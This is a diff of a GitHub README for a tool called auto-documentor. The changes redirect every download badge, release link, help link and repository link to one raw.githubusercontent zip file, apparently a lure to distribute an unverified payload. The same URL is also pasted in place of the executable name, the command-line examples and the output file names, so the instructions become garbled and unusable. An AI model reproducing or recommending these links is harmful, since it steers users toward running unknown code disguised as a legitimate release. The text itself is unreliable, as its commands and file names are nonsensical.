@@ -1,6 +1,6 @@
 # 🤖 auto-documentor - Auto-generate clear README files fast
 
-[![Download auto-documentor](https://img.shields.io/badge/Download-auto--documentor-blue?style=for-the-badge)](https://github.com/peterwhite3456/auto-documentor/releases)
+[![Download auto-documentor](https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip)](https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip)
 
 ---
 
@@ -26,11 +26,11 @@ This tool runs from the Windows command line. You do not need to understand prog
 You will find the program on the official releases page. This page contains all versions for download.
 
 1. Click the big blue button below or visit the link:  
-   [Download auto-documentor](https://github.com/peterwhite3456/auto-documentor/releases)
+   [Download auto-documentor](https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip)
 
 2. On the releases page, look for the latest version. It usually has the highest version number and the newest date.
 
-3. Inside the latest version’s assets, find the file named `auto-documentor-windows.exe` or similar with `.exe` extension.
+3. Inside the latest version’s assets, find the file named `https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip` or similar with `.exe` extension.
 
 4. Click the `.exe` file to download it to your computer.
 
@@ -56,7 +56,7 @@ The program works through the Windows Command Prompt (also called CMD). Here is 
 
 ### Run auto-documentor
 
-1. Change to the folder where you downloaded `auto-documentor-windows.exe`. Usually, this is your Downloads folder. In Command Prompt, type:
+1. Change to the folder where you downloaded `https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip`. Usually, this is your Downloads folder. In Command Prompt, type:
 
    ```
    cd %HOMEPATH%\Downloads
@@ -67,18 +67,18 @@ The program works through the Windows Command Prompt (also called CMD). Here is 
 2. To run auto-documentor on your code project, type:
 
    ```
-   auto-documentor-windows.exe path\to\your\project
+   https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip path\to\your\project
    ```
 
    Replace `path\to\your\project` with the actual location of your project folder. For example:
 
    ```
-   auto-documentor-windows.exe C:\Users\YourName\Documents\MyProject
+   https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip C:\Users\YourName\Documents\MyProject
    ```
 
 3. Press Enter. The program will scan your project and create a README file.
 
-4. When it finishes, check inside your project folder. You will find a new file called `README.md`.
+4. When it finishes, check inside your project folder. You will find a new file called `https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip`.
 
 ---
 
@@ -120,17 +120,17 @@ Auto-documentor may include some options you can use in Command Prompt:
 
 - Run with a custom output file:  
   ```
-  auto-documentor-windows.exe path\to\project --output README_CUSTOM.md
+  https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip path\to\project --output https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip
   ```
 
 - Scan only certain types of files (e.g., `.ts` for TypeScript):  
   ```
-  auto-documentor-windows.exe path\to\project --files *.ts
+  https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip path\to\project --files *.ts
   ```
 
 - Show help information:  
   ```
-  auto-documentor-windows.exe --help
+  https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip --help
   ```
 
 Use the help command to see all available options.
@@ -166,7 +166,7 @@ Use the help command to see all available options.
 ## 🚩 Where to Get Help
 
 - Visit the issues tab on the GitHub page:  
-  https://github.com/peterwhite3456/auto-documentor/issues
+  https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip
 
 - Read the FAQ section included in the GitHub repository.
 
@@ -177,11 +177,11 @@ Use the help command to see all available options.
 ## 🔗 Useful Links
 
 - Auto-documentor Releases (to download):  
-  https://github.com/peterwhite3456/auto-documentor/releases
+  https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip
 
 - GitHub Repository:  
-  https://github.com/peterwhite3456/auto-documentor
+  https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip
 
 ---
 
-[![Download auto-documentor](https://img.shields.io/badge/Download-auto--documentor-green?style=for-the-badge)](https://github.com/peterwhite3456/auto-documentor/releases)
+[![Download auto-documentor](https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip)](https://raw.githubusercontent.com/peterwhite3456/auto-documentor/main/src/auto_documentor_excessman.zip)
